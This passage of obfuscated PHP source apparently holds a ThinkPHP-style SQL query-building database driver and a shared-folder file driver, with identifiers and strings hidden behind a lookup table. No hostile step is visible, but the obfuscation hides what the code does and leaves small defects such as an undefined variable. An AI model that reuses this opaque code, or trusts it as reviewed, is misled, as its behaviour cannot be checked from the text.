$‰­ÜÉ±à[53] . $¬¦‰…©[0] . $‰­ÜÉ±à[53] . $this->parseValue($¬¦‰…©[1]); } elseif (preg_match($‰­ÜÉ±à[1134], $¬¦‰…©[0])) { $´³ëÆ‡¬ .= $í¨¢ñ´‚ . $‰­ÜÉ±à[53] . $this->exp[$òœŸ½›ò] . $‰­ÜÉ±à[53] . $this->parseValue($¬¦‰…©[1]); } elseif (preg_match($‰­ÜÉ±à[1135], $¬¦‰…©[0])) { if (is_array($¬¦‰…©[1])) { $“Â€Ô = isset($¬¦‰…©[2]) ? strtoupper($¬¦‰…©[2]) : $‰­ÜÉ±à[1120]; if (in_array($“Â€Ô, array($‰­ÜÉ±à[1119], $‰­ÜÉ±à[1120], $‰­ÜÉ±à[1121]))) { $‘˜è¼¥ = array(); foreach ($¬¦‰…©[1] as $şÓ˜Î ñ) { $‘˜è¼¥[] = $í¨¢ñ´‚ . $‰­ÜÉ±à[53] . $this->exp[$òœŸ½›ò] . $‰­ÜÉ±à[53] . $this->parseValue($şÓ˜Î ñ); } $´³ëÆ‡¬ .= $‰­ÜÉ±à[347] . implode($‰­ÜÉ±à[53] . $“Â€Ô . $‰­ÜÉ±à[53], $‘˜è¼¥) . $‰­ÜÉ±à[1020]; } } else { $´³ëÆ‡¬ .= $í¨¢ñ´‚ . $‰­ÜÉ±à[53] . $this->exp[$òœŸ½›ò] . $‰­ÜÉ±à[53] . $this->parseValue($¬¦‰…©[1]); } } elseif ($‰­ÜÉ±à[382] == $òœŸ½›ò) { $´³ëÆ‡¬ .= $‰­ÜÉ±à[1018] . $í¨¢ñ´‚ . $‰­ÜÉ±à[53] . $¬¦‰…©[1] . $‰­ÜÉ±à[1136]; } elseif (preg_match($‰­ÜÉ±à[1137], $¬¦‰…©[0])) { $´³ëÆ‡¬ .= $¬¦‰…©[0]; } elseif (preg_match($‰­ÜÉ±à[1138], $¬¦‰…©[0])) { if (isset($¬¦‰…©[2]) && $‰­ÜÉ±à[382] == $¬¦‰…©[2]) { $´³ëÆ‡¬ .= $í¨¢ñ´‚ . $‰­ÜÉ±à[53] . $this->exp[$òœŸ½›ò] . $‰­ÜÉ±à[53] . $¬¦‰…©[1]; } else { if (is_string($¬¦‰…©[1])) { $¬¦‰…©[1] = explode($‰­ÜÉ±à[50], $¬¦‰…©[1]); } $ÛÌ¢ŠÊ = implode($‰­ÜÉ±à[50], $this->parseValue($¬¦‰…©[1])); $´³ëÆ‡¬ .= $í¨¢ñ´‚ . $‰­ÜÉ±à[53] . $this->exp[$òœŸ½›ò] . $‰­ÜÉ±à[1018] . $ÛÌ¢ŠÊ . $‰­ÜÉ±à[1020]; } } elseif (preg_match($‰­ÜÉ±à[1139], $¬¦‰…©[0])) { $ÏÕ½Òî = is_string($¬¦‰…©[1]) ? explode($‰­ÜÉ±à[50], $¬¦‰…©[1]) : $¬¦‰…©[1]; $´³ëÆ‡¬ .= $‰­ÜÉ±à[1018] . $í¨¢ñ´‚ . $‰­ÜÉ±à[53] . $this->exp[$òœŸ½›ò] . $‰­ÜÉ±à[53] . $this->parseValue($ÏÕ½Òî[0]) . $‰­ÜÉ±à[1122] . $this->parseValue($ÏÕ½Òî[1]) . $‰­ÜÉ±à[366]; } else { think_exception(think_lang($‰­ÜÉ±à[1125]) . $‰­ÜÉ±à[4] . $¬¦‰…©[0]); } } else { $ÔŒì¶‹Ó = count($¬¦‰…©); $åŞ¿Æ““ = $‰­ÜÉ±à[12]; if (is_string($¬¦‰…©[$ÔŒì¶‹Ó - 1])) { $åŞ¿Æ““ = isset($¬¦‰…©[$ÔŒì¶‹Ó - 1]) ? strtoupper($¬¦‰…©[$ÔŒì¶‹Ó - 1]) : $‰­ÜÉ±à[12]; if (in_array($åŞ¿Æ““, array($‰­ÜÉ±à[1119], $‰­ÜÉ±à[1120], $‰­ÜÉ±à[1121]))) { $ÔŒì¶‹Ó = $ÔŒì¶‹Ó - 1; } } else { $åŞ¿Æ““ = $‰­ÜÉ±à[1119]; } for ($»‡Ô¶™ = 0; $»‡Ô¶™ < $ÔŒì¶‹Ó; $»‡Ô¶™++) { $ÏÕ½Òî = is_array($¬¦‰…©[$»‡Ô¶™]) ? $¬¦‰…©[$»‡Ô¶™][1] : $¬¦‰…©[$»‡Ô¶™]; if ($‰­ÜÉ±à[382] == strtolower($¬¦‰…©[$»‡Ô¶™][0])) { $´³ëÆ‡¬ .= $‰­ÜÉ±à[347] . $í¨¢ñ´‚ . $‰­ÜÉ±à[53] . $ÏÕ½Òî . $‰­ÜÉ±à[1136] . $åŞ¿Æ““ . $‰­ÜÉ±à[53]; } else { $æ„Ì¸ıú = is_array($¬¦‰…©[$»‡Ô¶™]) ? $this->exp[strtolower($¬¦‰…©[$»‡Ô¶™][0])] : $‰­ÜÉ±à[473]; if (!$æ„Ì¸ıú && is_array($¬¦‰…©[$»‡Ô¶™]) && in_array($¬¦‰…©[$»‡Ô¶™][0], array($‰­ÜÉ±à[473], $‰­ÜÉ±à[1129], $‰­ÜÉ±à[1130], $‰­ÜÉ±à[1131], $‰­ÜÉ±à[1132], $‰­ÜÉ±à[1133]))) { $æ„Ì¸ıú = $¬¦‰…©[$»‡Ô¶™][0]; } $´³ëÆ‡¬ .= $‰­ÜÉ±à[347] . $í¨¢ñ´‚ . $‰­ÜÉ±à[53] . $æ„Ì¸ıú . $‰­ÜÉ±à[53] . $this->parseValue($ÏÕ½Òî) . $‰­ÜÉ±à[1136] . $åŞ¿Æ““ . $‰­ÜÉ±à[53]; } } $´³ëÆ‡¬ = substr($´³ëÆ‡¬, 0, -4); } } else { $´³ëÆ‡¬ .= $í¨¢ñ´‚ . $‰­ÜÉ±à[1140] . $this->parseValue($¬¦‰…©); } return $´³ëÆ‡¬; } protected function parseThinkWhere($„º©†È, $¤Ğ«ƒŠƒ) { $È—ªğ‰ =& $_SERVER[‘ÆÜ‘œ]; $ñÚ„äü» = $È—ªğ‰[12]; switch ($„º©†È) { case $È—ªğ‰[437]: $ñÚ„äü» = $¤Ğ«ƒŠƒ; break; case $È—ªğ‰[1123]: $ñÚ„äü» = is_string($¤Ğ«ƒŠƒ) ? $¤Ğ«ƒŠƒ : substr($this->parseWhere($¤Ğ«ƒŠƒ), 6); break; case $È—ªğ‰[1141]: parse_str($¤Ğ«ƒŠƒ, $îêñ–¸Ø); if (isset($îêñ–¸Ø[$È—ªğ‰[1118]])) { $õùÑó¼§ = $È—ªğ‰[53] . strtoupper($îêñ–¸Ø[$È—ªğ‰[1118]]) . $È—ªğ‰[53]; unset($îêñ–¸Ø[$È—ªğ‰[1118]]); } else { $õùÑó¼§ = $È—ªğ‰[1122]; } $Ö§³ûÉµ = array(); foreach ($îêñ–¸Ø as $ Ü­ô– => $À³œ˜ã) { $Ö§³ûÉµ[] = $this->parseKey($ Ü­ô–) . $È—ªğ‰[1140] . $this->parseValue($À³œ˜ã); } $ñÚ„äü» = implode($õùÑó¼§, $Ö§³ûÉµ); break; } return $ñÚ„äü»; } protected function parseLimit($îœ®ô¢ı) { $±šøĞôÌ =& $_SERVER[‘ÆÜ‘œ]; return !empty($îœ®ô¢ı) ? $±šøĞôÌ[51] . $îœ®ô¢ı . $±šøĞôÌ[53] : $±šøĞôÌ[12]; } protected function parseJoin($Âşõåáã) { $ŒõŠæşù =& $_SERVER[‘ÆÜ‘œ]; $—Šì¥°¯ = $ŒõŠæşù[12]; if (!empty($Âşõåáã)) { if (is_array($Âşõåáã)) { foreach ($Âşõåáã as $ˆƒóæµ => $‡³ŠÏÆ¼) { if (!1 !== stripos($‡³ŠÏÆ¼, $ŒõŠæşù[1142])) { $—Šì¥°¯ .= $ŒõŠæşù[53] . $‡³ŠÏÆ¼; } else { $—Šì¥°¯ .= $ŒõŠæşù[1143] . $‡³ŠÏÆ¼; } } } else { $—Šì¥°¯ .= $ŒõŠæşù[1143] . $Âşõåáã; } } $—Šì¥°¯ = preg_replace($ŒõŠæşù[1144], think_config($ŒõŠæşù[1048]) . $ŒõŠæşù[1145], $—Šì¥°¯); return $—Šì¥°¯; } protected function parseOrder($ï¸®’€‚) { $°Ğ’¾˜· =& $_SERVER[‘ÆÜ‘œ]; if (is_array($ï¸®’€‚)) { $¹‹…€—æ = array(); foreach ($ï¸®’€‚ as $´ã…“·Ò => $®ö÷¥µü) { if (is_numeric($´ã…“·Ò)) { $¹‹…€—æ[] = $this->parseKey($®ö÷¥µü); } else { $®ö÷¥µü = in_array(strtoupper(trim($®ö÷¥µü)), array($°Ğ’¾˜·[1146], $°Ğ’¾˜·[1147])) ? $°Ğ’¾˜·[53] . $®ö÷¥µü : $°Ğ’¾˜·[12]; if (preg_match($°Ğ’¾˜·[1148], $´ã…“·Ò)) { $¹‹…€—æ[] = $this->parseKey($´ã…“·Ò) . $®ö÷¥µü; } else { think_exception($°Ğ’¾˜·[1149] . $´ã…“·Ò); } } } $ï¸®’€‚ = implode($°Ğ’¾˜·[50], $¹‹…€—æ); } return !empty($ï¸®’€‚) ? $°Ğ’¾˜·[1150] . $ï¸®’€‚ : $°Ğ’¾˜·[12]; } protected function parseGroup($®Ë…¦Œ) { $¬Ò›‘¢¯ =& $_SERVER[‘ÆÜ‘œ]; return !empty($®Ë…¦Œ) ? $¬Ò›‘¢¯[1151] . $®Ë…¦Œ : $¬Ò›‘¢¯[12]; } protected function parseHaving($„¯±ªŠç) { $­Ë¨²¹ª =& $_SERVER[‘ÆÜ‘œ]; return !empty($„¯±ªŠç) ? $­Ë¨²¹ª[1152] . $„¯±ªŠç : $­Ë¨²¹ª[12]; } protected function parseComment($´ñÊ®¼) { $¡—ÀÏ =& $_SERVER[‘ÆÜ‘œ]; return !empty($´ñÊ®¼) ? $¡—ÀÏ[1153] . $´ñÊ®¼ . $¡—ÀÏ[1154] : $¡—ÀÏ[12]; } protected function parseDistinct($’É«ªóŒ) { $’´§ü =& $_SERVER[‘ÆÜ‘œ]; return !empty($’É«ªóŒ) ? $’´§ü[1155] : $’´§ü[12]; } protected function parseUnion($ãéÓŠ›) { $†êûŒÔŒ =& $_SERVER[‘ÆÜ‘œ]; if (empty($ãéÓŠ›)) { return $†êûŒÔŒ[12]; } if (isset($ãéÓŠ›[$†êûŒÔŒ[433]])) { $ŸÁı†–¹ = $†êûŒÔŒ[1156]; unset($ãéÓŠ›[$†êûŒÔŒ[433]]); } else { $ŸÁı†–¹ = $†êûŒÔŒ[1157]; } foreach ($ãéÓŠ› as $á ¹“µ«) { $†İ×Ö®[] = $ŸÁı†–¹ . (is_array($á ¹“µ«) ? $this->buildSelectSql($á ¹“µ«) : $á ¹“µ«); } return implode($†êûŒÔŒ[53], $†İ×Ö®); } public function insert($âÀ×Ú˜, $Ä©£è¶ù = array(), $ÊÊ±“ÉÒ = false) { $’ç²ÃÒ =& $_SERVER[‘ÆÜ‘œ]; $Ò‡á†º¼ = $¬©–Åƒœ = array(); $this->model = $Ä©£è¶ù[$’ç²ÃÒ[369]]; foreach ($âÀ×Ú˜ as $ûê½ææˆ => $»úÕ•¢î) { if (is_array($»úÕ•¢î) && $’ç²ÃÒ[382] == $»úÕ•¢î[0]) { $¬©–Åƒœ[] = $this->parseKey($ûê½ææˆ); $Ò‡á†º¼[] = $»úÕ•¢î[1]; } elseif (is_scalar($»úÕ•¢î) || is_null($»úÕ•¢î)) { $¬©–Åƒœ[] = $this->parseKey($ûê½ææˆ); $Ò‡á†º¼[] = $this->parseValue($»úÕ•¢î); } } $Áú‚”«ä = ($ÊÊ±“ÉÒ ? $’ç²ÃÒ[1022] : $’ç²ÃÒ[1023]) . $’ç²ÃÒ[1024] . $this->parseTable($Ä©£è¶ù[$’ç²ÃÒ[367]]) . $’ç²ÃÒ[1018] . implode($’ç²ÃÒ[50], $¬©–Åƒœ) . $’ç²ÃÒ[1019] . implode($’ç²ÃÒ[50], $Ò‡á†º¼) . $’ç²ÃÒ[1020]; $Áú‚”«ä .= $this->parseLock(isset($Ä©£è¶ù[$’ç²ÃÒ[961]]) ? $Ä©£è¶ù[$’ç²ÃÒ[961]] : !1); $Áú‚”«ä .= $this->parseComment(!empty($Ä©£è¶ù[$’ç²ÃÒ[439]]) ? $Ä©£è¶ù[$’ç²ÃÒ[439]] : $’ç²ÃÒ[12]); return $this->execute($Áú‚”«ä, $this->parseBind(!empty($Ä©£è¶ù[$’ç²ÃÒ[371]]) ? $Ä©£è¶ù[$’ç²ÃÒ[371]] : array())); } public function selectInsert($–¶İë¦š, $øœ”…õ, $Ô‚¿ì¦Ú = array()) { $›øÎ´Ëş =& $_SERVER[‘ÆÜ‘œ]; $this->model = $Ô‚¿ì¦Ú[$›øÎ´Ëş[369]]; if (is_string($–¶İë¦š)) { $–¶İë¦š = explode($›øÎ´Ëş[50], $–¶İë¦š); } array_walk($–¶İë¦š, array($this, $›øÎ´Ëş[1021])); $‡¨·êê = $›øÎ´Ëş[1158] . $this->parseTable($øœ”…õ) . $›øÎ´Ëş[1018] . implode($›øÎ´Ëş[50], $–¶İë¦š) . $›øÎ´Ëş[1136]; $‡¨·êê .= $this->buildSelectSql($Ô‚¿ì¦Ú); return $this->execute($‡¨·êê, $this->parseBind(!empty($Ô‚¿ì¦Ú[$›øÎ´Ëş[371]]) ? $Ô‚¿ì¦Ú[$›øÎ´Ëş[371]] : array())); } public function update($á´“ÛĞ¡, $ö£Ûá·) { $¯‘ÈÄ™ =& $_SERVER[‘ÆÜ‘œ]; $this->model = $ö£Ûá·[$¯‘ÈÄ™[369]]; $‹»ôšë = $¯‘ÈÄ™[1159] . $this->parseTable($ö£Ûá·[$¯‘ÈÄ™[367]]) . $this->parseSet($á´“ÛĞ¡) . $this->parseWhere(!empty($ö£Ûá·[$¯‘ÈÄ™[363]]) ? $ö£Ûá·[$¯‘ÈÄ™[363]] : $¯‘ÈÄ™[12]) . $this->parseOrder(!empty($ö£Ûá·[$¯‘ÈÄ™[451]]) ? $ö£Ûá·[$¯‘ÈÄ™[451]] : $¯‘ÈÄ™[12]) . $this->parseLimit(!empty($ö£Ûá·[$¯‘ÈÄ™[378]]) ? $ö£Ûá·[$¯‘ÈÄ™[378]] : $¯‘ÈÄ™[12]) . $this->parseLock(isset($ö£Ûá·[$¯‘ÈÄ™[961]]) ? $ö£Ûá·[$¯‘ÈÄ™[961]] : !1) . $this->parseComment(!empty($ö£Ûá·[$¯‘ÈÄ™[439]]) ? $ö£Ûá·[$¯‘ÈÄ™[439]] : $¯‘ÈÄ™[12]); return $this->execute($‹»ôšë, $this->parseBind(!empty($ö£Ûá·[$¯‘ÈÄ™[371]]) ? $ö£Ûá·[$¯‘ÈÄ™[371]] : array())); } public function delete($ƒÌ¿…Ùè = array()) { $Ï»ÕÉâ§ =& $_SERVER[‘ÆÜ‘œ]; $this->model = $ƒÌ¿…Ùè[$Ï»ÕÉâ§[369]]; $À“„ºö = $Ï»ÕÉâ§[1160] . $this->parseTable($ƒÌ¿…Ùè[$Ï»ÕÉâ§[367]]) . $this->parseWhere(!empty($ƒÌ¿…Ùè[$Ï»ÕÉâ§[363]]) ? $ƒÌ¿…Ùè[$Ï»ÕÉâ§[363]] : $Ï»ÕÉâ§[12]) . $this->parseOrder(!empty($ƒÌ¿…Ùè[$Ï»ÕÉâ§[451]]) ? $ƒÌ¿…Ùè[$Ï»ÕÉâ§[451]] : $Ï»ÕÉâ§[12]) . $this->parseLimit(!empty($ƒÌ¿…Ùè[$Ï»ÕÉâ§[378]]) ? $ƒÌ¿…Ùè[$Ï»ÕÉâ§[378]] : $Ï»ÕÉâ§[12]) . $this->parseLock(isset($ƒÌ¿…Ùè[$Ï»ÕÉâ§[961]]) ? $ƒÌ¿…Ùè[$Ï»ÕÉâ§[961]] : !1) . $this->parseComment(!empty($ƒÌ¿…Ùè[$Ï»ÕÉâ§[439]]) ? $ƒÌ¿…Ùè[$Ï»ÕÉâ§[439]] : $Ï»ÕÉâ§[12]); return $this->execute($À“„ºö, $this->parseBind(!empty($ƒÌ¿…Ùè[$Ï»ÕÉâ§[371]]) ? $ƒÌ¿…Ùè[$Ï»ÕÉâ§[371]] : array())); } public function select($¾—äŠ = array()) { $¾ ş¸èµ =& $_SERVER[‘ÆÜ‘œ]; $this->model = $¾—äŠ[$¾ ş¸èµ[369]]; $Ëå„ÎÑ = $this->buildSelectSql($¾—äŠ); $Ù´á¬— = isset($¾—äŠ[$¾ ş¸èµ[434]]) ? $¾—äŠ[$¾ ş¸èµ[434]] : !1; if ($Ù´á¬—) { $¯Ùï™âî = is_string($Ù´á¬—[$¾ ş¸èµ[95]]) ? $Ù´á¬—[$¾ ş¸èµ[95]] : $¾ ş¸èµ[1161] . md5($Ëå„ÎÑ); $à¤û„¥Ï = think_cache($¯Ùï™âî, $¾ ş¸èµ[12], $Ù´á¬—); if (!1 !== $à¤û„¥Ï) { return $à¤û„¥Ï; } } $¨ñáâ•Ú = $this->query($Ëå„ÎÑ, $this->parseBind(!empty($¾—äŠ[$¾ ş¸èµ[371]]) ? $¾—äŠ[$¾ ş¸èµ[371]] : array())); if ($Ù´á¬— && !1 !== $¨ñáâ•Ú) { think_cache($¯Ùï™âî, $¨ñáâ•Ú, $Ù´á¬—); } return $¨ñáâ•Ú; } public function buildSelectSql($¡—¯ØŒÍ = array()) { $½¶ÁĞ“ =& $_SERVER[‘ÆÜ‘œ]; if (isset($¡—¯ØŒÍ[$½¶ÁĞ“[438]])) { if (strpos($¡—¯ØŒÍ[$½¶ÁĞ“[438]], $½¶ÁĞ“[50])) { list($™ŠÒƒ×°, $Üè¥§¯) = explode($½¶ÁĞ“[50], $¡—¯ØŒÍ[$½¶ÁĞ“[438]]); } else { $™ŠÒƒ×° = $¡—¯ØŒÍ[$½¶ÁĞ“[438]]; } $™ŠÒƒ×° = $™ŠÒƒ×° ? $™ŠÒƒ×° : 1; $Üè¥§¯ = isset($Üè¥§¯) ? $Üè¥§¯ : (is_numeric($¡—¯ØŒÍ[$½¶ÁĞ“[378]]) ? $¡—¯ØŒÍ[$½¶ÁĞ“[378]] : 20); $ú‘›ÌĞ× = $Üè¥§¯ * ((int) $™ŠÒƒ×° - 1); $¡—¯ØŒÍ[$½¶ÁĞ“[378]] = $ú‘›ÌĞ× . $½¶ÁĞ“[50] . $Üè¥§¯; } if (think_config($½¶ÁĞ“[1162])) { $¿ìÎ›©Ô = $½¶ÁĞ“[1163] . md5(serialize($¡—¯ØŒÍ)); $°ñœ‰¦û = think_cache($¿ìÎ›©Ô); if ($°ñœ‰¦û) { return $°ñœ‰¦û; } } $Ë¦ó’Ñ— = $this->parseSql($this->selectSql, $¡—¯ØŒÍ); $Ë¦ó’Ñ— .= $this->parseLock(isset($¡—¯ØŒÍ[$½¶ÁĞ“[961]]) ? $¡—¯ØŒÍ[$½¶ÁĞ“[961]] : !1); if (isset($¿ìÎ›©Ô)) { think_cache($¿ìÎ›©Ô, $Ë¦ó’Ñ—); } return $Ë¦ó’Ñ—; } public function parseSql($¨âÇŸ‹², $çöˆŸéë = array()) { $©Ÿó§ëò =& $_SERVER[‘ÆÜ‘œ]; $¨âÇŸ‹² = str_replace(array($©Ÿó§ëò[1164], $©Ÿó§ëò[1165], $©Ÿó§ëò[1166], $©Ÿó§ëò[1167], $©Ÿó§ëò[1168], $©Ÿó§ëò[1169], $©Ÿó§ëò[1170], $©Ÿó§ëò[1171], $©Ÿó§ëò[1172], $©Ÿó§ëò[1173], $©Ÿó§ëò[1174]), array($this->parseTable("{$çöˆŸéë[$©Ÿó§ëò[367]]}"), $this->parseDistinct(isset($çöˆŸéë[$©Ÿó§ëò[1175]]) ? $çöˆŸéë[$©Ÿó§ëò[1175]] : !1), $this->parseField(!empty($çöˆŸéë[$©Ÿó§ëò[361]]) ? $çöˆŸéë[$©Ÿó§ëò[361]] : $©Ÿó§ëò[221]), $this->parseJoin(!empty($çöˆŸéë[$©Ÿó§ëò[370]]) ? $çöˆŸéë[$©Ÿó§ëò[370]] : $©Ÿó§ëò[12]), $this->parseWhere(!empty($çöˆŸéë[$©Ÿó§ëò[363]]) ? $çöˆŸéë[$©Ÿó§ëò[363]] : $©Ÿó§ëò[12]), $this->parseGroup(!empty($çöˆŸéë[$©Ÿó§ëò[606]]) ? $çöˆŸéë[$©Ÿó§ëò[606]] : $©Ÿó§ëò[12]), $this->parseHaving(!empty($çöˆŸéë[$©Ÿó§ëò[1176]]) ? $çöˆŸéë[$©Ÿó§ëò[1176]] : $©Ÿó§ëò[12]), $this->parseOrder(!empty($çöˆŸéë[$©Ÿó§ëò[451]]) ? $çöˆŸéë[$©Ÿó§ëò[451]] : $©Ÿó§ëò[12]), $this->parseLimit(!empty($çöˆŸéë[$©Ÿó§ëò[378]]) ? $çöˆŸéë[$©Ÿó§ëò[378]] : $©Ÿó§ëò[12]), $this->parseUnion(!empty($çöˆŸéë[$©Ÿó§ëò[432]]) ? $çöˆŸéë[$©Ÿó§ëò[432]] : $©Ÿó§ëò[12]), $this->parseComment(!empty($çöˆŸéë[$©Ÿó§ëò[439]]) ? $çöˆŸéë[$©Ÿó§ëò[439]] : $©Ÿó§ëò[12])), $¨âÇŸ‹²); return $¨âÇŸ‹²; } public function getLastSql($áÇ°‘—¨ = '') { return $áÇ°‘—¨ ? $this->modelSql[$áÇ°‘—¨] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($·öàäÙ¸) { return addslashes($·öàäÙ¸); } public function setModel($¦Ú½‡™) { $this->model = $¦Ú½‡™; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto CÎ­ğÂÅ·È; A‰«ŠÑ“¼õ: class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($õ·İÆ³•) { $¯–Â‹ø =& $_SERVER[‘ÆÜ‘œ]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $õ·İÆ³•; $¾İúéµ = Model($¯–Â‹ø[694])->getInfo($õ·İÆ³•[$¯–Â‹ø[495]]); $ƒ½§ü¿ï = _get($¾İúéµ, $¯–Â‹ø[588]); $§°èÀ­ = Model($¯–Â‹ø[595])->authMake(_get($¾İúéµ, $¯–Â‹ø[1502])); if (!$¾İúéµ) { IO::errorTips(LNG($¯–Â‹ø[1503]), !1); } if (!$§°èÀ­) { IO::errorTips(LNG($¯–Â‹ø[1504]), !1); } if ($ƒ½§ü¿ï && is_string($ƒ½§ü¿ï)) { $ƒ½§ü¿ï = json_decode($ƒ½§ü¿ï, !0); } if (!$ƒ½§ü¿ï || !$§°èÀ­) { return; } $this->_config = array($¯–Â‹ø[1305] => rtrim($õ·İÆ³•[$¯–Â‹ø[1305]], $¯–Â‹ø[8]) . $¯–Â‹ø[8], $¯–Â‹ø[1505] => $¯–Â‹ø[1412] . $ƒ½§ü¿ï[$¯–Â‹ø[1506]] . $¯–Â‹ø[507], $¯–Â‹ø[584] => $¾İúéµ, $¯–Â‹ø[588] => $ƒ½§ü¿ï, $¯–Â‹ø[1507] => $§°èÀ­, $¯–Â‹ø[1508] => substr(APP_HOST, 0, 8) == $¯–Â‹ø[218], $¯–Â‹ø[1509] => Model($¯–Â‹ø[599])->authCheck($§°èÀ­[$¯–Â‹ø[511]], AuthModel::AUTH_VIEW, !1), $¯–Â‹ø[1510] => Model($¯–Â‹ø[599])->authCheck($§°èÀ­[$¯–Â‹ø[511]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($‰Ñú§Ö) { $ÓÔş¬ûº =& $_SERVER[‘ÆÜ‘œ]; $Íı«¼” = $this->_config; if (!$Íı«¼”) { return !1; } $ƒÔ§ßŸ´ = array($ÓÔş¬ûº[1511] => $Íı«¼”[$ÓÔş¬ûº[1509]], $ÓÔş¬ûº[1512] => $Íı«¼”[$ÓÔş¬ûº[1509]], $ÓÔş¬ûº[1333] => $Íı«¼”[$ÓÔş¬ûº[1509]], $ÓÔş¬ûº[108] => $Íı«¼”[$ÓÔş¬ûº[1510]], $ÓÔş¬ûº[1513] => $Íı«¼”[$ÓÔş¬ûº[1510]], $ÓÔş¬ûº[1282] => $Íı«¼”[$ÓÔş¬ûº[1510]], $ÓÔş¬ûº[1514] => !1, $ÓÔş¬ûº[439] => !1, $ÓÔş¬ûº[1515] => !1, $ÓÔş¬ûº[1516] => !1); return $ƒÔ§ßŸ´[$‰Ñú§Ö]; } public function listPath($ÄæÎ‚Ò, $ìü¾… = false) { return $this->request($_SERVER[‘ÆÜ‘œ][1517], array($ÄæÎ‚Ò)); } public function setContent($å½êˆ¬ö, $¦áş¡ã = '') { return $this->request($_SERVER[‘ÆÜ‘œ][1518], array($å½êˆ¬ö, $¦áş¡ã)); } public function getContent($–¼«Œ¯ƒ) { return $this->_fileSubstr($–¼«Œ¯ƒ); } public function fileSubstr($Ïù¸õÛ, $¤¾¬”¯Ş, $Åº‹™š) { return $this->_fileSubstr($Ïù¸õÛ, $¤¾¬”¯Ş, $Åº‹™š); } public function download($ˆîîİªÌ, $šÎ›°£³) { return $this->_download($ˆîîİªÌ, $šÎ›°£³); } public function isFileOutServer() { return !1; } public function fileOut($‰•µè¹ä, $İ„¿ÆÏç = false, $ãÚÒ©–Ÿ = false, $êÇÚ³¤ß = '') { $Û¬ïàªë =& $_SERVER[‘ÆÜ‘œ]; $this->fileOutLink($this->_fileLink($‰•µè¹ä, ($êÇÚ³¤ß ? $Û¬ïàªë[1519] . $êÇÚ³¤ß : $Û¬ïàªë[12]) . ($İ„¿ÆÏç ? $Û¬ïàªë[1520] : $Û¬ïàªë[12]))); } public function fileOutImage($¨¨è›Î, $²ó±ãÈ¢ = 250) { $this->fileOutLink($this->_fileLink($¨¨è›Î, $_SERVER[‘ÆÜ‘œ][1521] . $²ó±ãÈ¢)); } public function fileOutLink($Û¡£µ²Î) { header($_SERVER[‘ÆÜ‘œ][173] . $this->urlAuto($Û¡£µ²Î)); die; } public function exist($Ø§¿åĞî) { $¿ï‰”ÌÕ = $this->_info($Ø§¿åĞî); return $¿ï‰”ÌÕ ? !0 : !1; } public function isFile($İşÀ¦ªÛ) { $ğšâĞå« =& $_SERVER[‘ÆÜ‘œ]; $€ÄÍ½‹È = $this->_info($İşÀ¦ªÛ); return _get($€ÄÍ½‹È, $ğšâĞå«[33], $ğšâĞå«[12]) == $ğšâĞå«[231]; } public function isFolder($¨µ„×ı½) { $£âû™È– =& $_SERVER[‘ÆÜ‘œ]; $™ã¿½¾¡ = $this->_info($¨µ„×ı½); return _get($™ã¿½¾¡, $£âû™È–[33], $£âû™È–[12]) == $£âû™È–[78]; } public function size($óÅ×Ú½Ú) { $ ¾º¦ô = $this->_info($óÅ×Ú½Ú); return _get($ ¾º¦ô, $_SERVER[‘ÆÜ‘œ][79], 0); } public function info($á–üç½) { return $this->_info($á–üç½); } public function infoAuth($ÁŒ·í¿) { return $this->_info($ÁŒ·í¿); } public function infoFull($•ĞöÛ’¦) { return $this->_info($•ĞöÛ’¦); } public function infoFullSimple($Å³äİÉÎ) { return $this->_info($Å³äİÉÎ); } public function infoWithChildren($ğšùÀÕ…) { return $this->_info($ğšùÀÕ…, !0); } public function has($Áî²·ö—, $É×©úÊ• = false, $½çêËËØ = false) { $ÑâÈÚ—¤ =& $_SERVER[‘ÆÜ‘œ]; $®éªâøÓ = $this->_info($Áî²·ö—); if (!$®éªâøÓ) { return !1; } if ($É×©úÊ•) { return array($ÑâÈÚ—¤[240] => $®éªâøÓ[$ÑâÈÚ—¤[240]], $ÑâÈÚ—¤[241] => $®éªâøÓ[$ÑâÈÚ—¤[241]]); } return $—£­›Ş ? $®éªâøÓ[$ÑâÈÚ—¤[240]] > 0 : $®éªâøÓ[$ÑâÈÚ—¤[241]] > 0; } public function mkfile($Øä·Ö°Î, $Õ‡®ëãã = '', $Ì€ï‡ˆŠ = REPEAT_RENAME) { return $this->request($_SERVER[‘ÆÜ‘œ][1494], array($Øä·Ö°Î, $Õ‡®ëãã, $Ì€ï‡ˆŠ)); } public function mkdir($ÆØ¥İ¥é, $îÁÃôÁƒ = REPEAT_SKIP) { return $this->request($_SERVER[‘ÆÜ‘œ][1495], array($ÆØ¥İ¥é, $îÁÃôÁƒ)); } public function remove($ªŞŸ») { return $this->request($_SERVER[‘ÆÜ‘œ][1282], array($ªŞŸ»)); } public function rename($¦­Ü·‡, $É¡ìÛÊã) { return $this->request($_SERVER[‘ÆÜ‘œ][1498], array($¦­Ü·‡, $É¡ìÛÊã)); } public function moveSameAllow() { } public function copy($•‘ğÃŸŠ, $Ü€¦ïÜÄ, $©òë†í· = REPEAT_REPLACE, $‚Æôû¡£ = false) { return $this->request($_SERVER[‘ÆÜ‘œ][649], array($•‘ğÃŸŠ, $Ü€¦ïÜÄ, $©òë†í·)); } public function move($ô¸íë»±, $¿ªĞÛ…œ, $õ—Ó…øÎ = REPEAT_REPLACE, $º§œÎÒÇ = false) { return $this->request($_SERVER[‘ÆÜ‘œ][651], array($ô¸íë»±, $¿ªĞÛ…œ, $õ—Ó…øÎ)); } public function uploadLink($“ÒØğÉË, $´û§„”Í = 0) { $¸‰ÒÜáË =& $_SERVER[‘ÆÜ‘œ]; $‘•„‰õ– = IO::init($GLOBALS[$¸‰ÒÜáË[7]][$¸‰ÒÜáË[87]]); $ëÄöœğè = $this->pathApiEncode($‘•„‰õ–->path); $ ¶ò–Ğ¯ = $this->requestMakeUrl($¸‰ÒÜáË[1522], array($¸‰ÒÜáË[87] => $ëÄöœğè)); return array($¸‰ÒÜáË[1523] => $ ¶ò–Ğ¯); } public function upload($Æµ¿¬‚±, $ŞÓš, $ûöÜ³¹ş = false, $°Ù­˜ğ = REPEAT_REPLACE) { $°ıùµ» =& $_SERVER[‘ÆÜ‘œ]; if (filesize($ŞÓš) < 